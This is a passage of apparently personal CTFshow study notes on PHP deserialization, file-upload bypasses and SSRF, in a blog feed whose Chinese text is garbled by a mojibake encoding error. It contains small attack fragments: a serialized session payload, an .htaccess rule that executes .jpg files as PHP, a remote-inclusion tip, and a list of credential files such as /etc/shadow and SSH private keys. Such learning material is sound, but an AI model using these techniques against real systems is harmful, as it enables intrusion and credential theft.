<h2 id="3-phpåŸç”Ÿç±»"><a href="#3-phpåŸç”Ÿç±»" class="headerlink" title="3.phpåŸç”Ÿç±»:"></a>3.phpåŸç”Ÿç±»:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè§¦å‘__callé­”æœ¯æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡æƒ³å“ªä¸€äº›åŸç”Ÿç±»ä¸­å­˜åœ¨__callé­”æœ¯æ–¹æ³•ï¼Œå†é‡å†™é­”æœ¯æ–¹æ³•å°±è¡Œäº†</span><br></pre></td></tr></table></figure>

<h3 id="1-å¸¸è§å«-callé­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»"><a href="#1-å¸¸è§å«-callé­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»" class="headerlink" title="1.å¸¸è§å«__callé­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»:"></a>1.å¸¸è§å«__callé­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»:</h3><table>
<thead>
<tr>
<th>ç±»å</th>
<th>æ¥æº</th>
<th>æ˜¯å¦åŸç”Ÿ</th>
<th>åˆ©ç”¨æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>SoapClient</code></td>
<td>PHP æ‰©å±• <code>soap</code></td>
<td>âœ… æ˜¯</td>
<td>ä»»æ„æ–¹æ³•è°ƒç”¨æ—¶è§¦å‘ __callï¼Œå¯é€ æˆä»£ç é€»è¾‘åˆ†æµ</td>
</tr>
<tr>
<td><code>Phar</code></td>
<td>PHP æ‰©å±• <code>phar</code></td>
<td>âœ… æ˜¯</td>
<td>å­˜åœ¨ <code>__call</code>ï¼Œé…åˆæ–‡ä»¶æ“ä½œå¯èƒ½å½¢æˆ phar POP é“¾</td>
</tr>
<tr>
<td><code>SQLite3</code></td>
<td>æ‰©å±• <code>sqlite3</code></td>
<td>âœ… æ˜¯</td>
<td>å½“è°ƒç”¨ä¸å­˜åœ¨å‡½æ•°ï¼ˆå‡½æ•°æœªå®šä¹‰ï¼‰æ—¶è§¦å‘ __call</td>
</tr>
<tr>
<td><code>GMP</code></td>
<td>PHP æ‰©å±• <code>gmp</code></td>
<td>âœ… æ˜¯</td>
<td>è™½æœ‰å®ç°ä½†è¾ƒéš¾ç”¨äºåˆ©ç”¨</td>
</tr>
<tr>
<td><code>DateTimeImmutable</code></td>
<td>PHP æ ¸å¿ƒ</td>
<td>âœ… æ˜¯</td>
<td>å­˜åœ¨é­”æœ¯æ–¹æ³•ç»„åˆï¼Œä½†åˆ©ç”¨æ€§è¾ƒä½</td>
</tr>
<tr>
<td><code>ReflectionFunctionAbstract</code></td>
<td>PHP æ ¸å¿ƒ</td>
<td>âœ… æ˜¯</td>
<td>æŸäº›ç‰ˆæœ¬ä¸­æœ‰é­”æœ¯æ–¹æ³•ï¼Œä½†æ˜“å¤±æ•ˆ</td>
</tr>
<tr>
<td><code>PDO</code></td>
<td>PHP æ ¸å¿ƒ</td>
<td>âœ… æ˜¯</td>
<td>æŸäº›å­ç±»æœ‰ <code>__call</code>ï¼ˆå¦‚é€šè¿‡é©±åŠ¨åŠ¨æ€æ–¹æ³•ç»‘å®šï¼‰</td>
</tr>
<tr>
<td><code>DirectoryIterator</code></td>
<td>SPL</td>
<td>âœ… æ˜¯</td>
<td>é—´æ¥è§¦å‘å¯èƒ½å­˜åœ¨äºè¿­ä»£å™¨ç»„åˆä¸­</td>
</tr>
<tr>
<td><code>MongoDB\Driver\Manager</code></td>
<td>MongoDB æ‰©å±•</td>
<td>âœ… æ˜¯</td>
<td>æŸäº›è°ƒç”¨æœªå®šä¹‰æ–¹æ³•å¯è§¦å‘ __call</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢åŸç”Ÿç±»çš„æ–¹æ³•;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="variable">$magicMethods</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// &#x27;__destruct&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__toString&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__wakeup&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">    <span class="comment">// &#x27;__callStatic&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__get&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__isset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__unset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__invoke&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set_state&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$magicMethods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$class</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-å­—ç¬¦ä¸²æº¢å‡º"><a href="#4-å­—ç¬¦ä¸²æº¢å‡º" class="headerlink" title="4.å­—ç¬¦ä¸²æº¢å‡º:"></a>4.å­—ç¬¦ä¸²æº¢å‡º:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨ååºåˆ—åŒ–ä¹‹å&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;ï¼Œå¦‚æœèƒ½åšåˆ°è¿™æ ·ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€ä¸ª&#125;ä¹‹åçš„æ•°æ®ä¼šå¿½è§†</span></span><br></pre></td></tr></table></figure>

<h2 id="5-sessionååºåˆ—åŒ–æ¼æ´ï¼š"><a href="#5-sessionååºåˆ—åŒ–æ¼æ´ï¼š" class="headerlink" title="5.sessionååºåˆ—åŒ–æ¼æ´ï¼š"></a>5.sessionååºåˆ—åŒ–æ¼æ´ï¼š</h2><h3 id="1-phpå¤„ç†å™¨"><a href="#1-phpå¤„ç†å™¨" class="headerlink" title="1.phpå¤„ç†å™¨:"></a>1.phpå¤„ç†å™¨:</h3><p>session.serialize_handlerçš„å¼•æ“æœ‰çœ‹ä¸‹é¢ã€‚<br>æ³¨ï¼šphp_serializeæ˜¯ä»5.5.4å¼€å§‹ä½¿ç”¨çš„ã€‚</p>
<table>
<thead>
<tr>
<th align="left"><strong>å¤„ç†å™¨åç§°</strong></th>
<th align="left"><strong>å­˜å‚¨æ ¼å¼</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>php</strong></td>
<td align="left"><strong>é”®å + ç«–çº¿ + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></td>
</tr>
<tr>
<td align="left"><strong>php_binary</strong></td>
<td align="left"><strong>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</strong></td>
</tr>
<tr>
<td align="left"><strong>php_serialize</strong></td>
<td align="left"><strong>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„</strong>  php_serializeåœ¨å†…éƒ¨ç®€å•åœ°ç›´æ¥ä½¿ç”¨ serialize&#x2F;unserializeå‡½æ•°</td>
</tr>
</tbody></table>
<p>php_serializeå¤„ç†å™¨æ˜¯è¿›è¡Œäº†ä¸€æ¬¡phpåºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ å…¥äº†ä¸€ä¸ª|ï¼Œåœ¨phpå¤„ç†å™¨çš„ç†è§£æ˜¯</p>
<blockquote>
<p>è¿™ä¸‰éƒ¨åˆ†</p>
<p>a:1:{s:7:â€sessionâ€;s:37:â€ &#x2F;&#x2F;é”®åï¼Œè¿™ä¸ªæ˜¯ä¸è§£æçš„</p>
<p>| &#x2F;&#x2F;åˆ†éš”ç¬¦</p>
<p>O:1:â€Aâ€:1:{s:1:â€aâ€;s:9:â€phpinfo()â€;} &#x2F;&#x2F;é”®å€¼</p>
</blockquote>
<h3 id="2-session-starté»˜è®¤å¼€å¯"><a href="#2-session-starté»˜è®¤å¼€å¯" class="headerlink" title="2.session_starté»˜è®¤å¼€å¯:"></a>2.session_starté»˜è®¤å¼€å¯:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()ï¼Œè¿™é‡Œphpçš„ç‰ˆæœ¬æ˜¯<span class="number">7.3</span>.<span class="number">11</span>ï¼Œæ‰€ä»¥å°±æ˜¯é»˜è®¤å°±æ˜¯<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="6-phpåœ°å€å¼•ç”¨"><a href="#6-phpåœ°å€å¼•ç”¨" class="headerlink" title="6.phpåœ°å€å¼•ç”¨:"></a>6.phpåœ°å€å¼•ç”¨:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å¦‚æœéœ€è¦ä¸€ä¸ªå€¼ç­‰äºå¦ä¸€ä¸ªçš„åœ°å€   ---&amp;$   ---&amp;å–åœ°å€</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="1-user-iniçš„ä½¿ç”¨"><a href="#1-user-iniçš„ä½¿ç”¨" class="headerlink" title="1. .user.iniçš„ä½¿ç”¨:"></a>1. .user.iniçš„ä½¿ç”¨:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åŸç†: æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼š<span class="keyword">require</span>(./a.jpg);è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äºauto_prepend_fileæ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›auto_append_fileåœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<span class="keyword">exit</span>()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰æ‰€ä»¥è¦æ±‚å½“å‰ç›®å½•å¿…é¡»è¦æœ‰phpæ–‡ä»¶,å·§åˆçš„æ˜¯è¿™é¢˜uploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</span><br><span class="line">    --å¿…é¡»åœ¨uploadç›®å½•ä¸‹æœ‰index.phpè¿™æ ·æ‰æˆåŠŸï¼Œæ²¡æœ‰å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ª</span><br><span class="line">                                       --auto_append_fileåœ¨æœ¨é©¬æ–‡ä»¶ä¸Šä¼ åä¸Šä¼ </span><br><span class="line">                                       --auto_prepend_fileåœ¨æœ¨é©¬æ–‡ä»¶ä¸Šä¼ å‰ä¸Šä¼ </span><br></pre></td></tr></table></figure>

<h3 id="2-ç»•è¿‡å†…å®¹é‡Œä¸èƒ½åŒ…å«php"><a href="#2-ç»•è¿‡å†…å®¹é‡Œä¸èƒ½åŒ…å«php" class="headerlink" title="2.ç»•è¿‡å†…å®¹é‡Œä¸èƒ½åŒ…å«php:"></a>2.ç»•è¿‡å†…å®¹é‡Œä¸èƒ½åŒ…å«php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. æ¡ä»¶ï¼šshort_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. æ— æ¡ä»¶</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. æ¡ä»¶ï¼š å¼€å¯é…ç½®å‚æ•°asp_tags=on ä¸”phpç‰ˆæœ¬ &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. æ¡ä»¶ï¼šphpç‰ˆæœ¬ &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-å¢åŠ æ–‡ä»¶å¤´"><a href="#3-å¢åŠ æ–‡ä»¶å¤´" class="headerlink" title="3.å¢åŠ æ–‡ä»¶å¤´:"></a>3.å¢åŠ æ–‡ä»¶å¤´:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---æ˜¯GIFå›¾åƒæ ¼å¼çš„ä¸€ç§ç‰ˆæœ¬æ ‡è¯†</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ–‡ä»¶ç±»å‹</th>
<th>é­”æœ¯å¤´ï¼ˆåå…­è¿›åˆ¶ï¼‰</th>
<th>é­”æœ¯å¤´ï¼ˆASCIIï¼‰</th>
<th>ç¤ºä¾‹ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td><strong>GIF89a</strong></td>
<td><code>47 49 46 38 39 61</code></td>
<td><code>GIF89a</code></td>
<td>æ­£è§„ GIF å›¾</td>
</tr>
<tr>
<td><strong>GIF87a</strong></td>
<td><code>47 49 46 38 37 61</code></td>
<td><code>GIF87a</code></td>
<td>è€ç‰ˆæœ¬ GIF å›¾</td>
</tr>
<tr>
<td><strong>PNG</strong></td>
<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
<td><code>.PNG....</code></td>
<td>PNG å›¾</td>
</tr>
<tr>
<td><strong>JPG</strong> &#x2F; JPEG</td>
<td><code>FF D8 FF</code></td>
<td>N&#x2F;A</td>
<td>å¼€å¤´æ˜¯ <code>FFD8FF</code>ï¼Œç»“å°¾æ˜¯ <code>FFD9</code></td>
</tr>
<tr>
<td><strong>PDF</strong></td>
<td><code>25 50 44 46 2D</code></td>
<td><code>%PDF-</code></td>
<td>ç»å…¸æ–‡æ¡£ä¸Šä¼ ç»•è¿‡</td>
</tr>
<tr>
<td><strong>ZIP</strong></td>
<td><code>50 4B 03 04</code></td>
<td><code>PK..</code></td>
<td>ä¸Šä¼ å‹ç¼©åŒ…</td>
</tr>
<tr>
<td><strong>RAR</strong></td>
<td><code>52 61 72 21 1A 07 00</code></td>
<td><code>Rar!...</code></td>
<td>å‹ç¼©æ–‡ä»¶</td>
</tr>
<tr>
<td><strong>EXE</strong>ï¼ˆWindowsï¼‰</td>
<td><code>4D 5A</code></td>
<td><code>MZ</code></td>
<td>å¯æ‰§è¡Œæ–‡ä»¶</td>
</tr>
<tr>
<td><strong>ELF</strong>ï¼ˆLinuxï¼‰</td>
<td><code>7F 45 4C 46</code></td>
<td><code>.ELF</code></td>
<td>Linux äºŒè¿›åˆ¶</td>
</tr>
<tr>
<td><strong>MP3</strong></td>
<td><code>49 44 33</code></td>
<td><code>ID3</code></td>
<td>éŸ³é¢‘æ–‡ä»¶å¤´</td>
</tr>
<tr>
<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
<td><code>50 4B 03 04</code></td>
<td>ZIPï¼</td>
<td>Office æ–°ç‰ˆå…¶å®æ˜¯ ZIP å®¹å™¨</td>
</tr>
<tr>
<td><strong>OLD DOC (97-2003)</strong></td>
<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
<td>N&#x2F;A</td>
<td>è€å¼ Office æ–‡ä»¶</td>
</tr>
</tbody></table>
<h3 id="4-è¿œç¨‹åŒ…å«"><a href="#4-è¿œç¨‹åŒ…å«" class="headerlink" title="4.è¿œç¨‹åŒ…å«:"></a>4.è¿œç¨‹åŒ…å«:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨æœåŠ¡å™¨ä¸Šå¯ä»¥é€šè¿‡ipè½¬æ•°å­—ï¼Œè®©ä»–è®¿é—®æœ¨é©¬è„šæœ¬ç½‘ç«™ï¼Œå¹¶æ‰§è¡Œ</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>

<h3 id="5-é€šè¿‡jpg-gif-pngäºŒæ¬¡æ¸²æŸ“"><a href="#5-é€šè¿‡jpg-gif-pngäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="5.é€šè¿‡jpg.gif.pngäºŒæ¬¡æ¸²æŸ“;"></a>5.é€šè¿‡jpg.gif.pngäºŒæ¬¡æ¸²æŸ“;</h3><h4 id="1-æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ¸²æŸ“"><a href="#1-æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="1.æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ¸²æŸ“:"></a>1.æ˜¯å¦å­˜åœ¨äºŒæ¬¡æ¸²æŸ“:</h4><table>
<thead>
<tr>
<th>æ¡ä»¶</th>
<th>è¯´æ˜</th>
<th>åˆ¤æ–­æ–¹æ³•</th>
</tr>
</thead>
<tbody><tr>
<td>ä¸Šä¼ åå›¾åƒè¢«é‡æ–°å‹ç¼©</td>
<td>MD5ä¸ä¸€è‡´</td>
<td>ä¸Šä¼ åä¸‹è½½å›¾ç‰‡å¯¹æ¯”</td>
</tr>
<tr>
<td>ä¸Šä¼ çš„ EXIF ä¿¡æ¯è¢«æ¸…é™¤</td>
<td>æ–‡ä»¶å±æ€§è¢«æŠ¹æ‰</td>
<td><code>exif_read_data()</code> æ£€æŸ¥</td>
</tr>
<tr>
<td>ä¼ªä»£ç å¤±æ•ˆ</td>
<td>æœ¨é©¬å†…å®¹è¢«å»æ‰</td>
<td><code>&lt;?php ... ?&gt;</code> è¢«æ¸…ç©º</td>
</tr>
<tr>
<td>æ–‡ä»¶å¤§å°è¢«å¤§å¹…ç¼©å°</td>
<td>è¯´æ˜è¢«é‡æ–°å¤„ç†</td>
<td>æŸ¥çœ‹ä¸Šä¼ å‰åå¤§å°å·®è·</td>
</tr>
<tr>
<td>Webshell ä¸å†æ‰§è¡Œ</td>
<td>äºŒæ¬¡æ¸²æŸ“æ¸…é™¤äº†æ¶æ„ä»£ç </td>
<td>æ‰‹åŠ¨è®¿é—®åˆ¤æ–­æ˜¯å¦èƒ½æ‰§è¡ŒPHPä»£ç </td>
</tr>
</tbody></table>
<h3 id="6-é€šè¿‡-htaccessåŒ…å«"><a href="#6-é€šè¿‡-htaccessåŒ…å«" class="headerlink" title="6.é€šè¿‡.htaccessåŒ…å«:"></a>6.é€šè¿‡.htaccessåŒ…å«:</h3><p>httpd,httpdæ˜¯apacheçš„æœåŠ¡ï¼Œå…³äºapacheçš„æ–‡ä»¶ä¸Šä¼ ä¸­æœ‰ä¸€ä¸ª.htaccessé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶ä¸º.htaccess</span><br><span class="line">    å†…å®¹:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2025/06/02/ctfshow/ssrf/</url>
    <content><![CDATA[<h1 id="SSRFçš„è¿ç”¨åŸç†"><a href="#SSRFçš„è¿ç”¨åŸç†" class="headerlink" title="SSRFçš„è¿ç”¨åŸç†:"></a>SSRFçš„è¿ç”¨åŸç†:</h1><h2 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†:"></a>1.åŸç†:</h2><p>åˆ©ç”¨å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ï¼Œå‘å†…éƒ¨æˆ–å¤–éƒ¨èµ„æºå‘é€ä¼ªé€ çš„è¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°ä»¥ä¸‹ç›®çš„ï¼š</p>
<ul>
<li>æ¢æµ‹å†…ç½‘ç»“æ„ï¼ˆç«¯å£æ‰«æã€æœåŠ¡å‘ç°ï¼‰</li>
<li>è®¿é—®å†…ç½‘APIï¼ˆå¦‚äº‘æœåŠ¡å…ƒæ•°æ®æ¥å£ï¼‰</li>
<li>è¿›è¡Œèº«ä»½ä¼ªé€ ï¼ˆè®¿é—®æºå¸¦èº«ä»½ä¿¡æ¯çš„èµ„æºï¼‰</li>
<li>é€ æˆDoSã€åå¼¹è¯·æ±‚ç­‰æ”»å‡»</li>
</ul>
<h2 id="2-å¸¸ç”¨æ£€æµ‹æ–¹æ³•"><a href="#2-å¸¸ç”¨æ£€æµ‹æ–¹æ³•" class="headerlink" title="2.å¸¸ç”¨æ£€æµ‹æ–¹æ³•:"></a>2.å¸¸ç”¨æ£€æµ‹æ–¹æ³•:</h2><table>
<thead>
<tr>
<th>æ£€æµ‹ç±»å‹</th>
<th>æ–¹æ³•</th>
<th>æè¿°</th>
<th>æ£€æµ‹æ˜¯å¦æˆåŠŸçš„æ–¹å¼</th>
<th>ç»•è¿‡æ€è·¯</th>
</tr>
</thead>
<tbody><tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>è®¿é—®å†…ç½‘åœ°å€</strong></td>
<td>127.0.0.1ã€localhostã€169.254.169.254ã€å†…ç½‘IPæ®µç­‰</td>
<td>è¿”å›å†…å®¹ã€å“åº”æ—¶é—´å·®</td>
<td>ä½¿ç”¨æ•´æ•°ã€16è¿›åˆ¶ã€<code>[::]</code>ç­‰å˜ä½“ç»•è¿‡</td>
</tr>
<tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>DNSlogå¹³å°æ£€æµ‹</strong></td>
<td>ä¼ å…¥å¤–éƒ¨ DNS åœ°å€ï¼ˆå¦‚ <code>xx.ceye.io</code>ï¼‰</td>
<td>DNSå¹³å°è®°å½•åˆ°è§£æè¯·æ±‚</td>
<td>åŸŸåè·³è½¬ã€ä¼ªåè®®ç­‰è§„é¿å®‰å…¨ç­–ç•¥</td>
</tr>
<tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>HTTPå¤–å¸¦æ£€æµ‹</strong></td>
<td>æ„é€  URL å‘èµ·å¤–éƒ¨ HTTP è¯·æ±‚</td>
<td>æœåŠ¡å™¨è®¿é—®æ—¥å¿—ã€Burp Collaboratorã€tcpdump</td>
<td>åŸºäº SSRF çš„è·³è½¬é“¾</td>
</tr>
<tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>æ–‡ä»¶åè®®</strong></td>
<td>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd ç­‰</td>
<td>å¦‚æœè¯»å–å†…å®¹è¿”å›ï¼Œè¯æ˜å­˜åœ¨ SSRF</td>
<td>fileåè®®é»‘åå•ç»•è¿‡ã€ä¼ªåè®®ç»„åˆ</td>
</tr>
<tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>gopheråè®®æ£€æµ‹</strong></td>
<td>æ„é€  Redis æ³¨å…¥ &#x2F; SSRF-RCE</td>
<td>è¿”å›å†…å®¹ä¸ºç©ºï¼Œä½†é…åˆåç«¯éªŒè¯æˆåŠŸ</td>
<td>è¢«å¤šæ•°é˜²ç«å¢™é™åˆ¶ï¼Œæ³¨æ„åè®®æ··æ·†</td>
</tr>
<tr>
<td>ğŸŒ å¸¸è§</td>
<td><strong>è¯·æ±‚å»¶è¿Ÿæ£€æµ‹</strong></td>
<td>è®¿é—® <code>http://10.0.0.1:81</code> ç­‰ï¼Œè§‚å¯Ÿå»¶è¿Ÿ</td>
<td>è¯·æ±‚é˜»å¡ &#x2F; è¶…æ—¶ &#x2F; å“åº”æ…¢</td>
<td>ç”¨äºç«¯å£æ‰«ææ—¶åšåˆ¤æ–­</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>è¯·æ±‚å¤´æ³¨å…¥æ£€æµ‹</strong></td>
<td>ä¼ªé€  <code>Host</code>, <code>X-Forwarded-Host</code>, <code>X-Real-IP</code> ç­‰</td>
<td>åç«¯é”™è¯¯ä¿¡æ¯ä¸­æš´éœ² Host ä¿¡æ¯</td>
<td>é…åˆ Host header æ¼æ´æ‰“ SSRF</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>Open Redirect è”åŠ¨æ£€æµ‹</strong></td>
<td>å…ˆè·³è½¬å† SSRF</td>
<td>å¯è¢« SSRF åˆ©ç”¨çš„ OpenRedirect</td>
<td>å¸¸è§„è¿‡æ»¤éš¾ä»¥è¯†åˆ« URL è·³è½¬é“¾</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>SVG æ¸²æŸ“è§¦å‘ HTTP è¯·æ±‚</strong></td>
<td>æäº¤åµŒå…¥å¤–é“¾çš„ SVGï¼Œè§‚å¯Ÿç›®æ ‡æœåŠ¡å™¨æ˜¯å¦å‘èµ·è¯·æ±‚</td>
<td>éœ€è¦ç²¾å¿ƒæ„é€ å›¾åƒå¹¶å¤–å¸¦é“¾æ¥</td>
<td>ç»•è¿‡éURLå‹ç™½åå•</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>PDFç”ŸæˆåŠŸèƒ½ SSRF</strong></td>
<td>æäº¤å¸¦å›¾åƒURLçš„ HTMLï¼Œè®©æœåŠ¡å™¨æ¸²æŸ“ PDF è§¦å‘è¯·æ±‚</td>
<td>å¤–éƒ¨æœåŠ¡å™¨æˆ–DNSè®°å½•</td>
<td>PDFæœåŠ¡é€šå¸¸å¯æ‰§è¡Œå¤–éƒ¨è¯·æ±‚</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>OAuth&#x2F;SSO é‡å®šå‘åˆ©ç”¨</strong></td>
<td>å€ŸåŠ©SSOç¬¬ä¸‰æ–¹å›è°ƒURLå‘èµ· SSRF</td>
<td>éœ€è¦ç»“åˆOAuthå®ç°ç»†èŠ‚</td>
<td>é‡å®šå‘ + SSRFåˆå‡»é“¾</td>
</tr>
<tr>
<td>âš ï¸ ä¸å¸¸è§</td>
<td><strong>SMTP SSRF</strong></td>
<td><code>smtp://127.0.0.1:25</code> å‘é‚®ä»¶æœåŠ¡æ³¨å…¥è¯·æ±‚</td>
<td>é‚®ä»¶è¢«å‘é€ã€è¡Œä¸ºä¾§ä¿¡é“</td>
<td>å¤šåè®®SSRF + å†…ç½‘é’“é±¼é“¾</td>
</tr>
</tbody></table>
<h2 id="3-linxuå¸¸è§æ•æ„Ÿç›®å½•"><a href="#3-linxuå¸¸è§æ•æ„Ÿç›®å½•" class="headerlink" title="3.linxuå¸¸è§æ•æ„Ÿç›®å½•:"></a>3.linxuå¸¸è§æ•æ„Ÿç›®å½•:</h2><table>
<thead>
<tr>
<th>è·¯å¾„</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/passwd</code></td>
<td>ç”¨æˆ·ä¿¡æ¯ï¼ˆæ— å¯†ç ï¼‰</td>
</tr>
<tr>
<td><code>/etc/shadow</code></td>
<td>åŠ å¯†å¯†ç ï¼ˆéœ€rootæƒé™ï¼‰</td>
</tr>
<tr>
<td><code>/root/.ssh/id_rsa</code></td>
<td>SSHç§é’¥</td>
</tr>
<tr>
<td><code>/var/www/html/config.php</code></td>
<td>Webç«™ç‚¹é…ç½®</td>
</tr>
<tr>
<td><code>/proc/self/environ</code></td>
<td>å½“å‰è¿›ç¨‹ç¯å¢ƒå˜é‡ï¼ˆå¯èƒ½æ³„æ¼Tokenï¼‰</td>
</tr>
<tr>
<td><code>/proc/version</code></td>
<td>å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</td>
</tr>
</tbody></table>
